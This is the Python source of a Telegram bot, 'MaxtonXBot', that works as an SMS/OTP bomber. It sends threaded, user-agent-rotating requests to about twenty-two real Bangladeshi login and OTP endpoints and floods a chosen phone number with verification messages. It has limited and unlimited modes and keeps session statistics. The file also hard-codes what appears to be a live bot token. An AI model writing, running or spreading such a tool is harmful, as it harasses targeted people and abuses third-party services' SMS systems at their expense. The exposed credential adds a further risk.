import requests
import threading
import time
import random
from datetime import datetime
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

user_states = {}
bombing_stats = []  # Statista-এর জন্য হিস্ট্রি

api_endpoints = [
    {
        "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
        "method": "POST",
        "json": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "url": "https://api.apex4u.com/api/auth/login",
        "method": "POST",
        "json": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "url": "https://api.busbd.com.bd/api/auth",
        "method": "POST",
        "json": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "url": "https://api.deeptoplay.com/v2/auth/login",
        "method": "POST",
        "json": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "url": "https://api.garibookadmin.com/api/v3/user/login",
        "method": "POST",
        "json": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "url": "https://api.osudpotro.com/api/v1/users/send_otp",
        "method": "POST",
        "json": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
        "method": "POST",
        "json": lambda phone: {"mobile": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "url": "https://api.shikho.com/public/activity/otp",
        "method": "POST",
        "json": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "url": "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
        "method": "POST",
        "json": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP",
        "method": "POST",
        "json": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "url": "https://app.addatimes.com/api/login",
        "method": "POST",
        "json": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "url": "https://app.deshal.net/api/auth/login",
        "method": "POST",
        "json": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "url": "https://auth.qcoom.com/api/v1/otp/send",
        "method": "POST",
        "json": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "url": "https://auth.shukhee.com/register?mobile=",
        "method": "GET",
        "url_append": True,
        "headers": {"User-Agent": "Mozilla/5.0"}
    },
    {
        "url": "https://backend.timezonebd.com/api/v1/user/otp-request",
        "method": "POST",
        "json": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "url": "https://bb-api.bohubrihi.com/public/activity/otp",
        "method": "POST",
        "json": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=",
        "method": "GET",
        "url_append": True,
        "headers": {"User-Agent": "Mozilla/5.0"}
        },
    {
        "url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
        "method": "POST",
        "json": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "url": "https://core.easy.com.bd/api/v1/registration",
        "method": "POST",
        "json": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "url": "https://da-api.robi.com.bd/da-nll/otp/send",
        "method": "POST",
        "json": lambda phone: {"phoneNumber": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "url": "https://fundesh.com.bd/api/auth/generateOTP",
        "method": "POST",
        "json": lambda phone: {"mobile": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
        "method": "POST",
        "json": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    }
]

user_agents = [
    "Mozilla/5.0 (Linux; Android 10; Mobile)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
]

def send_request(api, phone):
    headers = api.get("headers", {}).copy()
    headers["User-Agent"] = random.choice(user_agents)
    try:
        if api["method"] == "GET":
            url = api["url"] + phone if api.get("url_append", False) else api["url"]
            response = requests.get(url, headers=headers, timeout=5)
        else:
            json_data = api["json"](phone) if "json" in api else None
            response = requests.post(api["url"], json=json_data, headers=headers, timeout=5)
        return True
    except Exception:
        return False

def unlimited_bombing_loop(bot, chat_id, user_id, phone):
    total_sent = 0
    total_success = 0
    total_fail = 0
    start_time = datetime.now()
    while user_states.get(user_id, {}).get("bombing", False):
        threads = []
        success = 0
        fail = 0
        def run_api(api):
            nonlocal success, fail
            if send_request(api, phone):
                success += 1
            else:
                fail += 1
        for _ in range(10):
            for api in api_endpoints:
                t = threading.Thread(target=run_api, args=(api,))
                threads.append(t)
                t.start()
                time.sleep(0.002)
        for t in threads:
            t.join()
        attempted = success + fail
        total_sent += attempted
        total_success += success
        total_fail += fail
        bot.send_message(
            chat_id=chat_id,
            text=(
                f"📊 মোট ট্রাই: {total_sent}\n"
                f"✅ সফল: {total_success}\n"
                f"❌ ব্যর্থ: {total_fail}\n"
                f"(এই রাউন্ড: {attempted} ট্রাই, {success} সফল, {fail} ব্যর্থ)"
            )
        )
        time.sleep(1)
    # Bombing finished, save stat and show home
    bombing_stats.append({
        "mode": "Unlimited",
        "phone": phone,
        "limit": "∞",
        "total_sent": total_sent,
        "success": total_success,
        "fail": total_fail,
        "start_time": start_time.strftime("%Y-%m-%d %H:%M:%S"),
        "end_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    keyboard = [["Start", "Statista"]]
    markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    bot.send_message(chat_id=chat_id, text="⛔ Unlimited Bombing Stopped!", reply_markup=markup)
    user_states[user_id]["bombing"] = False
    user_states[user_id].pop("phone", None)
    user_states[user_id].pop("limit", None)
    user_states[user_id].pop("mode", None)

def limited_bombing_loop(bot, chat_id, user_id, phone, limit):
    total_sent = 0
    total_success = 0
    total_fail = 0
    bombed = 0
    start_time = datetime.now()
    while bombed < limit and user_states.get(user_id, {}).get("bombing", False):
        threads = []
        success = 0
        fail = 0
        def run_api(api):
            nonlocal success, fail
            if send_request(api, phone):
                success += 1
            else:
                fail += 1
        for api in api_endpoints:
            if bombed >= limit:
                break
            t = threading.Thread(target=run_api, args=(api,))
            threads.append(t)
            t.start()
            time.sleep(0.002)
            bombed += 1
        for t in threads:
            t.join()
        attempted = success + fail
        total_sent += attempted
        total_success += success
        total_fail += fail
        bot.send_message(
            chat_id=chat_id,
            text=(
                f"📊 মোট ট্রাই: {total_sent}\n"
                f"✅ সফল: {total_success}\n"
                f"❌ ব্যর্থ: {total_fail}\n"
                f"(এই রাউন্ড: {attempted} ট্রাই, {success} সফল, {fail} ব্যর্থ)"
            )
        )
        time.sleep(1)
    bombing_stats.append({
        "mode": "Limited",
        "phone": phone,
        "limit": limit,
        "total_sent": total_sent,
        "success": total_success,
        "fail": total_fail,
        "start_time": start_time.strftime("%Y-%m-%d %H:%M:%S"),
        "end_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    keyboard = [["Start", "Statista"]]
    markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    bot.send_message(chat_id=chat_id, text="✅ Limited Bombing Finished!", reply_markup=markup)
    user_states[user_id]["bombing"] = False
    user_states[user_id].pop("phone", None)
    user_states[user_id].pop("limit", None)
    user_states[user_id].pop("mode", None)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [["Start", "Statista"]]
    markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_photo(
        photo="https://i.postimg.cc/0yCpmF6B/1751575789815.jpg",
        caption="Welcome to MaxtonXBot. This is created by Robert Maxton",
        reply_markup=markup
    )
    user_id = update.effective_user.id
    user_states[user_id] = {"bombing": False, "mode": None}

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    # Home: Show start menu
    if text == "Start":
        keyboard = [["Limited Bombing", "Unlimited Bombing"], ["Statista"]]
        markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text("Choose Bombing Mode:", reply_markup=markup)
        user_states[user_id] = {"bombing": False, "mode": None}
        return

    # Statista button
    if text == "Statista":
        if not bombing_stats:
            await update.message.reply_text("⏳ কোনো Bombing Session হয়নি!")
            return
        stats_msg = "📈 Bombing Statista\n"
        for idx, stat in enumerate(bombing_stats[::-1], 1):  # latest first
            stats_msg += (
                f"\nSession #{idx}\n"
                f"Mode: {stat['mode']}\n"
                f"Number: {stat['phone']}\n"
                f"Limit: {stat['limit']}\n"
                f"Total: {stat['total_sent']} | Success: {stat['success']} | Fail: {stat['fail']}\n"
                f"Start: {stat['start_time']}\n"
                f"End: {stat['end_time']}\n"
                f"{'-'*22}"
            )
        keyboard = [["Start", "Statista"]]
        markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text(stats_msg, reply_markup=markup)
        return

    # Limited Bombing mode selection
    if text == "Limited Bombing":
        user_states[user_id] = {"bombing": False, "mode": "limited"}
        await update.message.reply_text("Enter Number (11 digit):")
        return

    # Unlimited Bombing mode selection
    if text == "Unlimited Bombing":
        user_states[user_id] = {"bombing": False, "mode": "unlimited"}
        await update.message.reply_text("Enter Number (11 digit):")
        return

    # Handle phone number for both mode
    if user_states.get(user_id, {}).get("mode") in ["limited", "unlimited"] and "phone" not in user_states[user_id]:
        phone = text.replace("+88", "").replace(" ", "")
        if not phone.isdigit() or len(phone) != 11:
            await update.message.reply_text("❌ Enter 11 digit number!")
            return
        user_states[user_id]["phone"] = phone
        if user_states[user_id]["mode"] == "limited":
            await update.message.reply_text("How many messages to send? (e.g. 10):")
            return
        else:
            user_states[user_id]["bombing"] = True
            keyboard = [["🛑 Stop"]]
            markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
            await update.message.reply_text(f"🚀 Unlimited Bombing Started for {phone}!", reply_markup=markup)
            threading.Thread(target=unlimited_bombing_loop, args=(context.bot, update.message.chat_id, user_id, phone)).start()
            return

    # Handle limit for limited bombing
    if user_states.get(user_id, {}).get("mode") == "limited" and "phone" in user_states[user_id] and "limit" not in user_states[user_id]:
        if not text.isdigit() or int(text) < 1:
            await update.message.reply_text("❌ Enter a valid positive number!")
            return
        limit = int(text)
        user_states[user_id]["limit"] = limit
        user_states[user_id]["bombing"] = True
        keyboard = [["🛑 Stop"]]
        markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text(f"🚀 Limited Bombing Started for {user_states[user_id]['phone']} ({limit} messages)!", reply_markup=markup)
        threading.Thread(target=limited_bombing_loop, args=(context.bot, update.message.chat_id, user_id, user_states[user_id]['phone'], limit)).start()
        return

    # Stop bombing
    if text == "🛑 Stop":
        if user_id in user_states:
            user_states[user_id]["bombing"] = False
            user_states[user_id].pop("phone", None)
            user_states[user_id].pop("limit", None)
            user_states[user_id].pop("mode", None)
        keyboard = [["Start", "Statista"]]
        markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text("⛔ Bombing Stopped!", reply_markup=markup)
        return

app = ApplicationBuilder().token("7937514743:AAHBGi1CJLilzNW81-H4SDu3QaZ_FmF8OH8").build()
app.add_handler(CommandHandler("start", start))
app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), message_handler))

print("✅ Bot is running...")
app.run_polling()
